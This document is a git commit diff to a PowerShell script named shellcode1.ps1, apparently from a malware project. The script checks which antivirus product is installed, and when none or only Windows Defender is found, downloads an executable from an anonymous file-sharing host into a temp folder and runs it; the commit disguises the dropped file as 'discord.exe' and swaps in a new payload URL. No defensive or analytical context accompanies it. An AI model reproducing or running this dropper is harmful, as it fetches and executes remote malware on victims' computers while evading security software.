ed5a97c28542c1d2ccc2a77c8ae596d483cca7e9
43a1723 <hai1723notgay@gmail.com>
2024-08-14 12:22:24 +0700

    Update shellcode1.ps1

--- Extras/shellcode1.ps1
+++ Extras/shellcode1.ps1
@@ -1,8 +1,8 @@
-$temp = "$temp\skull.exe"; 
+$temp = "$temp\discord.exe"; 
 $av = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"; 
 if (($av.Count -eq 0) -or ($av.DisplayName -eq "Windows Defender")) { 
     if (-not (Test-Path $temp)) { 
-        Invoke-WebRequest "https://anonsharing.com/file/4f095b99c1c9cec6/scam.exe" -OutFile $temp 
+        Invoke-WebRequest "https://anonsharing.com/file/ba33376922946e37/join.exe" -OutFile $temp 
     } 
     Start-Process $temp 
 }
